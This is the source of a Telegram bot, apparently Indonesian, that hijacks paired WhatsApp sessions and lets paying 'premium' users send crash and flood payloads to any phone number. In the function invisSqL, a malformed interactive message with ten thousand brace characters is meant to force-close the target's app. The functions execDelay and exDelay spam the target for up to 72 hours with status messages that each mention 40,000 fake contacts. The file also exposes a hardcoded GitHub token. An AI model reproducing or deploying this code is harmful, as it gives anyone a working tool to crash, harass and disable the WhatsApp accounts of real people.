const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const axios = require('axios');
const path = require("path");
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    proto,
    prepareWAMessageMedia,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const P = require("pino");
const chalk = require('chalk');
const figlet = require('figlet');
const rimraf = require("rimraf");
const gradient = require('gradient-string');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './Database/premium.json';
const vipFile = './Database/vip.json';
const ownerFile = './Database/owner.json';
let bots = [];

let settings = JSON.parse(fs.readFileSync('./settings.json'));
let isGroupOnly = settings.groupOnly;
settings.groupOnly = isGroupOnly;
fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
//========================================================\\ 
const GITHUB_TOKEN_LIST_URL = "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";

async function fetchValidTokens() {
    try {
        const response = await axios.get(GITHUB_TOKEN_LIST_URL);
        return response.data; 
    } catch (error) {
        console.error(chalk.red("Gagal mengambil token database di GitHub!"), error.message);
        return [];
    }
}

async function validateToken() {
    console.log(chalk.blue("🔍 Loading Check Token Bot..."));
    const validTokens = await fetchValidTokens();

    if (!validTokens.tokens || !Array.isArray(validTokens.tokens)) {
        console.log(chalk.red("Data token tidak valid dari GitHub!"));
        process.exit(1);
    }

    if (!validTokens.tokens.includes(BOT_TOKEN)) {
        console.log(chalk.red("❌ Token Tidak Terdaftar Di Database! Silahkan Hubungi @kioraaw"));
        process.exit(1);
    }

    console.clear();
    console.log(chalk.bold.white("✅ Token Terdaftar Di Database! Menyiapkan Bot..."));
}
//========================================================\\

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

const sessions = new Map();
const SESSIONS_DIR = "./session";
const SESSIONS_FILE = "./session/active_sessions.json";

let darkcrash = null;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const videoUrl = "https://files.catbox.moe/4l0wpi.mp4";

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}
// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
🔁 FOUND ACTIVE WHATSAPP SESSION
`);

      for (const botNumber of activeNumbers) {
        console.log(`
🔁 CURRENTLY CONNECTING WHATSAPP
`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        darkcrash = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          darkcrash.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
✅ SUCCESSFUL NUMBER CONNECTION
`);
              sessions.set(botNumber, darkcrash);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
❌ TRY RECONNECTING THE NUMBER
`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          darkcrash.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
// --- Koneksi WhatsApp ---
async function connectToWhatsApp(botNumber, ctx) {
  const chatId = ctx.chat.id;

  const sentMsg = await ctx.telegram.sendMessage(
    chatId,
    `*PAIRING WHATSAPP*
`,
    {
           parse_mode: "Markdown",
           reply_markup: {
             inline_keyboard: [
                [{ text: "🔁", callback_data: `ignore` }]
           ]
        }
     }
  );

  const statusMessage = sentMsg.message_id;

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  darkcrash = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  darkcrash.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await ctx.telegram.editMessageText(
        chatId,
        statusMessage,
        null,
        `⏳`,
        { parse_mode: "Markdown" }
      );
        await connectToWhatsApp(botNumber, ctx);
      } else {
        await ctx.telegram.editMessageText(
        chatId,
        statusMessage,
        null,
        `❌ *PAIRING WHATSAPP GAGAL*`,
        {
           parse_mode: "Markdown",
           reply_markup: {
             inline_keyboard: [
                [{ text: "🔁 Ulangi Pairing", callback_data: `retrypairing_${botNumber}` }]
           ]
        }
     }
  );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, darkcrash);
      saveActiveSessions(botNumber);
      await ctx.telegram.editMessageText(
      chatId,
      statusMessage,
      null,
      `✅ *WHATSAPP CONNECTED*`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅", callback_data: "ignore" }]
          ]
       }
    }
 );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await darkcrash.requestPairingCode(botNumber, "NEVERDIE");
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  const messageText = `
*PAIRING WHATSAPP*
<|> CODE : \`${formattedCode}\`
<|> TAP BUTTON UNTUK MASUK KE WHATSAPP`;

  await ctx.telegram.editMessageText(
    chatId,
    statusMessage,
    null,
    messageText,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Open WhatsApp", url: `https://wa.me/${botNumber}` }
          ]
        ]
      }
    }
  );
}
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `*PAIRING WHATSAPP ERROR*
<|> Error: ${error.message}
`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "❌", callback_data: "ignore" }]
              ]
           }
        }
     );
  }
}
});

  darkcrash.ev.on("creds.update", saveCreds);

  return darkcrash;
}

// Helper untuk simpan JSON
function saveJSON(filePath, data) {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}

// Helper untuk load JSON
function loadJSON(filePath) {
    return JSON.parse(fs.readFileSync(filePath));
}

// Muat ID owner, vip dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let vipUsers = loadJSON(vipFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna mempunyai akses
const checkVip = (ctx, next) => {
    const vipUsers = loadJSON(vipFile);
    if (!vipUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("🚫 Anda bukan pengguna vip!");
    }
    next();
};

const checkPremium = (ctx, next) => {
    const premiumUsers = loadJSON(premiumFile);
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("🚫 Anda bukan pengguna premium!");
    }
    next();
};

const checkOwner = (ctx, next) => {
    const ownerUsers = loadJSON(ownerFile);
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("🚫 Anda bukan owner!");
    }
    next();
};

//++++++++++++++++++++++++++++++++++++++++++//
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
//++++++++++++++++++++++++++++++++++++++++++//
bot.use((ctx, next) => {
  if (isGroupOnly && ctx.chat && ctx.chat.type === 'private') {
    return ctx.reply('❌ Bot ini hanya bisa digunakan di grup saat mode grouponly on.');
  }
  return next();
});
//++++++++++++++++++++++++++++++++++++++++++//
function getUserStatus(userId) {
  const ownerUsers = loadJSON(ownerFile);
  const vipUsers = loadJSON(vipFile);
  const premiumUsers = loadJSON(premiumFile);

  return {
    isOwner: ownerUsers.includes(userId),
    isVip: vipUsers.includes(userId),
    isPremium: premiumUsers.includes(userId)
  };
}
//++++++++++++++++++++++++++++++++++++++++++//
bot.command('start', async (ctx) => {
  const userId = ctx.from?.id?.toString() || '';
  const { isOwner, isVip, isPremium } = getUserStatus(userId);
  const ownerStatus = isOwner ? '✅' : '❌';
  const vipStatus = isVip ? '✅' : '❌';
  const premiumStatus = isPremium ? '✅' : '❌';
  const username = ctx.from.first_name || ctx.from.username || "User";

  // 1. Kirim stiker dulu
  const sentSticker = await ctx.replyWithSticker({ url: 'https://files.catbox.moe/d8xj0d.jpg' });

  // 2. Tunggu 2 detik
  await sleep(2000);

  // 3. Hapus stiker
  try {
    await ctx.deleteMessage(sentSticker.message_id);
  } catch (err) {
    console.log("❌ Gagal menghapus stiker:", err.message);
  }

  // 4. Tampilkan menu utama (video + tombol)
  const menu = await ctx.replyWithVideo(videoUrl, {
    caption: `
\`\`\`
<|> 𝐆𝐄𝐓𝐎 𝐗 𝐒𝐀𝐓𝐎𝐑𝐎𝐔
\`\`\`
( 🇯🇵 ) *こんにちは。Ghost が開発した Telegram ボットの Never Die です。あなたの日々の活動をお手伝いしたいです。もっとかっこよく成長できるように応援してください。どうもありがとうございます。*
`,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: "( ⚙️ ) 𝐎𝐰𝐧𝐞𝐫 𝐓𝐨𝐨𝐥𝐬", callback_data: "ownermenu" },        
          { text: "( 🔍 ) 𝐂𝐞𝐤 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data: "statusmenu" }
        ],         
        [
          { text: "( 👤 ) 𝐂𝐫𝐞𝐚𝐭𝐨𝐫", url: "https://t.me/kioraaw" },
          { text: "( 🧠 ) 𝐈𝐧𝐟𝐨", url: "https://t.me/testimonighosttt" }
        ],
        [
          { text: "( 🌸 ) 𝐂𝐫𝐚𝐬𝐡𝐞𝐫", callback_data: "crashermenu" },
          { text: "( 🍃 ) 𝐃𝐞𝐥𝐚𝐲", callback_data: "delaymenu" }
        ]
      ]
    }
  });
});

// ================== Customisasi Callback Query ===================
bot.on("callback_query", async (ctx) => {
  const userId = ctx.from?.id?.toString() || '';
  const message = ctx.callbackQuery?.message;
  const data = ctx.callbackQuery?.data;
  const username = ctx.from.first_name || ctx.from.username || "User";

  if (!message || !message.chat) return ctx.answerCbQuery("Terjadi kesalahan.");

  const chatId = message.chat.id;
  const messageId = message.message_id;

  let newCaption = "";
  let newButtons = [];

  if (data === "crashermenu") {
  const premiumUsers = loadJSON(premiumFile); // Tambahkan ini agar data terbaru dimuat

  if (!premiumUsers.includes(userId)) {
    return ctx.answerCbQuery("🚫 Anda bukan premium!", { show_alert: true });
  }

  ctx.session = ctx.session || {};
  ctx.session.awaitingCrashNumber = true;

  return ctx.reply("Silakan kirim nomor target (contoh: 628xxxx).", {
  reply_markup: {
    inline_keyboard: [
      [{ text: "❌ Batal", callback_data: "cancelcrash" }]
    ]
  }
});
  } else if (data === "delaymenu") {
  const premiumUsers = loadJSON(premiumFile); // Tambahkan ini agar data terbaru dimuat

  if (!premiumUsers.includes(userId)) {
    return ctx.answerCbQuery("🚫 Anda bukan premium!", { show_alert: true });
  }

  ctx.session = ctx.session || {};
  ctx.session.awaitingDelayNumber = true;

  return ctx.reply("Silakan kirim nomor target (contoh: 628xxxx).", {
  reply_markup: {
    inline_keyboard: [
      [{ text: "❌ Batal", callback_data: "canceldelay" }]
    ]
  }
});
  } else if (data === "cancelcrash") {
    ctx.session = ctx.session || {};
    delete ctx.session.awaitingCrashNumber;
    return ctx.editMessageText("🚫 Pengiriman bug dibatalkan.");
  } else if (data === "canceldelay") {
    ctx.session = ctx.session || {};
    delete ctx.session.awaitingDelayNumber;
    return ctx.editMessageText("🚫 Pengiriman bug dibatalkan.");
  } else if (data === "ownermenu") {
    newCaption = `
\`\`\`
<|> 𝐆𝐄𝐓𝐎 𝐗 𝐒𝐀𝐓𝐎𝐑𝐎𝐔
\`\`\`
( 📄 ) *Daftar List Menu:*
• /addvip <id> 
• /addprem <id> 
• /delvip <id> 
• /delprem <id> 
• /grouponly <on/off>
• /listbot
• /addpairing <no>
• /delsession
`;
    newButtons = [[{ text: "↩️ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮", callback_data: "mainmenu" }]];
  } else if (data === "statusmenu") {
    const { isOwner, isVip, isPremium } = getUserStatus(userId);
    newCaption = `
\`\`\`
<|> 𝐆𝐄𝐓𝐎 𝐗 𝐒𝐀𝐓𝐎𝐑𝐎𝐔
\`\`\`
( 📟 ) *Status Kamu Saat Ini:*
• Username : ${username}
• Telegram ID : ${userId}
• Device : ${ctx.from.language_code.toUpperCase() || 'Unknown'}
• Owner : ${isOwner ? '✅' : '❌'}
• Vip : ${isVip ? '✅' : '❌'}
• Premium : ${isPremium ? '✅' : '❌'}
`;
    newButtons = [[{ text: "↩️ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮", callback_data: "mainmenu" }]];
  } else if (data === "mainmenu") {
    newCaption = `
\`\`\`
<|> 𝐆𝐄𝐓𝐎 𝐗 𝐒𝐀𝐓𝐎𝐑𝐎𝐔
\`\`\`
( 🇯🇵 ) *こんにちは。Ghost が開発した Telegram ボットの Never Die です。あなたの日々の活動をお手伝いしたいです。もっとかっこよく成長できるように応援してください。どうもありがとうございます。*
`;
    newButtons = [
      [
        { text: "( ⚙ ) 𝐎𝐰𝐧𝐞𝐫 𝐓𝐨𝐨𝐥𝐬", callback_data: "ownermenu" },
        { text: "( 🔍 ) 𝐂𝐞𝐤 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data: "statusmenu" }
      ],
      [
        { text: "( 👤 ) 𝐂𝐫𝐞𝐚𝐭𝐨𝐫", url: "https://t.me/kioraaw" },
        { text: "( 🧠 )  𝐈𝐧𝐟𝐨", url: "https://t.me/realptkioraa" }
      ],
      [
          { text: "( 🌸 ) 𝐂𝐫𝐚𝐬𝐡𝐞𝐫", callback_data: "crashermenu" },
          { text: "( 🍃 ) 𝐃𝐞𝐥𝐚𝐲", callback_data: "delaymenu" }
      ]
    ];
  }

  try {
    await ctx.telegram.editMessageMedia(chatId, messageId, null, {
      type: "video",
      media: videoUrl,
      caption: newCaption,
      parse_mode: "Markdown"
    });
    await ctx.telegram.editMessageReplyMarkup(chatId, messageId, null, {
      inline_keyboard: newButtons
    });
  } catch (err) {
    console.error("Gagal update menu:", err);
    ctx.answerCbQuery("❌ Gagal memperbarui menu");
  }
});

//list bot
bot.command('listbot', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "❌ Tidak ada bot WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let xdarkcrashdarkcrash = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${xdarkcrashdarkcrash}. ${botNumber}\n`;
      xdarkcrashdarkcrash++;
    }

    ctx.reply(
      `📝 *Daftar bot yang terhubung*\n\n<|> ${botList}`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    ctx.reply(
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});

// Command: /addvip (OWNER ONLY)
bot.command("addvip", (ctx) => {
    const senderId = String(ctx.from.id);
    const ownerList = loadJSON(ownerFile);
    if (!ownerList.includes(senderId)) {
        return ctx.reply("❌ Command ini hanya bisa digunakan oleh Owner.");
    }

    const args = ctx.message.text.split(" ");
    const userId = args[1];
    if (!userId || !/^\d+$/.test(userId)) {
        return ctx.reply("❌ Masukkan ID pengguna yang valid.\nContoh: /addvip 123456789");
    }

    const vipUsers = loadJSON(vipFile);
    if (vipUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status VIP.`);
    }

    vipUsers.push(userId);
    saveJSON(vipFile, vipUsers);
    ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses VIP!`);
});

// Command: /delvip (OWNER ONLY)
bot.command("delvip", (ctx) => {
    const senderId = String(ctx.from.id);
    const ownerList = loadJSON(ownerFile);
    if (!ownerList.includes(senderId)) {
        return ctx.reply("❌ Command ini hanya bisa digunakan oleh Owner.");
    }

    const args = ctx.message.text.split(" ");
    const userId = args[1];
    if (!userId || !/^\d+$/.test(userId)) {
        return ctx.reply("❌ Masukkan ID pengguna yang valid.\nContoh: /delvip 123456789");
    }

    let vipUsers = loadJSON(vipFile);
    if (!vipUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar VIP.`);
    }

    vipUsers = vipUsers.filter(id => id !== userId);
    saveJSON(vipFile, vipUsers);
    ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar VIP.`);
});

// Command: /addprem (OWNER & VIP ONLY)
bot.command("addprem", (ctx) => {
    const senderId = String(ctx.from.id);
    const ownerList = loadJSON(ownerFile);
    const vipList = loadJSON(vipFile);
    if (!ownerList.includes(senderId) && !vipList.includes(senderId)) {
        return ctx.reply("❌ Command ini hanya untuk Owner atau VIP.");
    }

    const args = ctx.message.text.split(" ");
    const userId = args[1];
    if (!userId || !/^\d+$/.test(userId)) {
        return ctx.reply("❌ Masukkan ID pengguna yang valid.\nContoh: /addprem 123456789");
    }

    const premiumUsers = loadJSON(premiumFile);
    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
    ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses Premium!`);
});

// Command: /delprem (OWNER & VIP ONLY)
bot.command("delprem", (ctx) => {
    const senderId = String(ctx.from.id);
    const ownerList = loadJSON(ownerFile);
    const vipList = loadJSON(vipFile);
    if (!ownerList.includes(senderId) && !vipList.includes(senderId)) {
        return ctx.reply("❌ Command ini hanya untuk Owner atau VIP.");
    }

    const args = ctx.message.text.split(" ");
    const userId = args[1];
    if (!userId || !/^\d+$/.test(userId)) {
        return ctx.reply("❌ Masukkan ID pengguna yang valid.\nContoh: /delprem 123456789");
    }

    let premiumUsers = loadJSON(premiumFile);
    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);
    ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Premium.`);
});

// Command untuk addsender WhatsApp
bot.command("addpairing", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addpairing <nomor_wa>");
    }

    const inputNumber = args[1];
    const botNumber = inputNumber.replace(/[^0-9]/g, "");
    const chatId = ctx.chat.id;

    try {
        await connectToWhatsApp(botNumber, ctx);
    } catch (error) {
        console.error("Error in addpairing:", error);
        await ctx.reply("❌ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
    }
});

// cmd delsession langsubg restart panel
bot.command("delsession", checkOwner, async (ctx) => {
  const folderPath = "./session";

  try {
    if (!fs.existsSync(folderPath)) {
      return ctx.reply("📁 Tidak ada folder sesi yang ditemukan.");
    }

    rimraf.sync(folderPath);

    await ctx.reply("✅ Semua sesi berhasil dihapus.\n🔄 Bot akan restart dalam 2 detik...");

    setTimeout(() => {
      process.exit(1); // trigger restart di Pterodactyl
    }, 2000);
  } catch (err) {
    console.error("❌ Gagal menghapus session:", err);
    ctx.reply("❌ Terjadi kesalahan saat menghapus sesi.");
  }
});

// cmd grouponly
bot.command('grouponly', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const input = args[0];

  if (!['on', 'off'].includes(input)) {
    return ctx.reply('Gunakan perintah: `/grouponly on` atau `/grouponly off`', { parse_mode: 'Markdown' });
  }

  isGroupOnly = input === 'on';
  ctx.reply(`✅ Mode grouponly berhasil diubah ke: *${input.toUpperCase()}*`, { parse_mode: 'Markdown' });
});

// handler cmd bug
bot.on("text", async (ctx) => {
  const userId = ctx.from?.id?.toString();
  const text = ctx.message.text.trim();
  const cleaned = text.replace(/[^0-9]/g, "");

  ctx.session = ctx.session || {};
// Crasher
  if (ctx.session.awaitingCrashNumber) {

    // Validasi dulu nomor
    if (!cleaned || cleaned.length < 9) {
      return ctx.reply("❌ Nomor tidak valid. Gunakan format seperti 628xxxx");
    }

    // Hapus status menunggu crash
    delete ctx.session.awaitingCrashNumber;

    // Pastikan user premium
    if (!premiumUsers.includes(userId)) return;

    const target = cleaned + "@s.whatsapp.net";

    await ctx.reply("🚀 Mengirim bug ke target...");

    try {
      if (sessions.size === 0) return ctx.reply("❌ Tidak ada sesi WhatsApp aktif.");

      for (const [_, sock] of sessions.entries()) {
        await invisSqL(target);
        await sleep(1000);
      }

      await ctx.replyWithVideo({ url: "https://files.catbox.moe/4l0wpi.mp4" }, {
        caption: `
\`\`\`
<|> 𝐆𝐄𝐓𝐎 𝐗 𝐒𝐀𝐓𝐎𝐑𝐎𝐔
\`\`\`
*あなたの日々の活動をお手伝いしたいです。もっとかっこよく成長できるように応援してください。どうもありがとうございます。*

✅ *Bug berhasil dikirim ke* *${cleaned}*
🚀 *Type Force Close*`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "( 📲 ) Cek Target", url: `https://wa.me/${cleaned}` }]
          ]
        }
      });

    } catch (error) {
      console.error("❌ Error saat mengirim bug:", error);
      return ctx.reply("❌ Terjadi kesalahan saat mengirim bug.");
    }
  }
// Delay 
    if (ctx.session.awaitingDelayNumber) {

    // Validasi dulu nomor
    if (!cleaned || cleaned.length < 9) {
      return ctx.reply("❌ Nomor tidak valid. Gunakan format seperti 628xxxx");
    }

    // Hapus status menunggu crash
    delete ctx.session.awaitingDelayNumber;

    // Pastikan user premium
    if (!premiumUsers.includes(userId)) return;

    const target = cleaned + "@s.whatsapp.net";

    await ctx.reply("🚀 Mengirim bug ke target...");

    try {
      if (sessions.size === 0) return ctx.reply("❌ Tidak ada sesi WhatsApp aktif.");

      for (const [_, sock] of sessions.entries()) {
        await execDelay(target, durationHours = 72);
        await exDelay(target);
        await sleep(2000);
      }

      await ctx.replyWithVideo({ url: "https://files.catbox.moe/4l0wpi.mp4" }, {
        caption: `
\`\`\`
<|> 𝐆𝐄𝐓𝐎 𝐗 𝐒𝐀𝐓𝐎𝐑𝐎𝐔
\`\`\`
*あなたの日々の活動をお手伝いしたいです。もっとかっこよく成長できるように応援してください。どうもありがとうございます。*

✅ *Bug berhasil dikirim ke* *${cleaned}*
🚀 *Type Hard Delay*`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "( 📲 ) Cek Target", url: `https://wa.me/${cleaned}` }]
          ]
        }
      });

    } catch (error) {
      console.error("❌ Error saat mengirim bug:", error);
      return ctx.reply("❌ Terjadi kesalahan saat mengirim bug.");
    }
  }
});

// ========================= [ FUNC ] ========================= \\

async function invisSqL(isTarget) {
const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await darkcrash.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

async function execDelay(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 1000) {
        await exDelay(target);
        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/1000 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 1000 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 1000 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

async function exDelay(target) {
await darkcrash.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `XrL ~ Dominations\n https://t.me/xrellyy\n`,
contextInfo: {
mentionedJid: [
"6285215587498@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
}
}
}, {
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
}
);
}

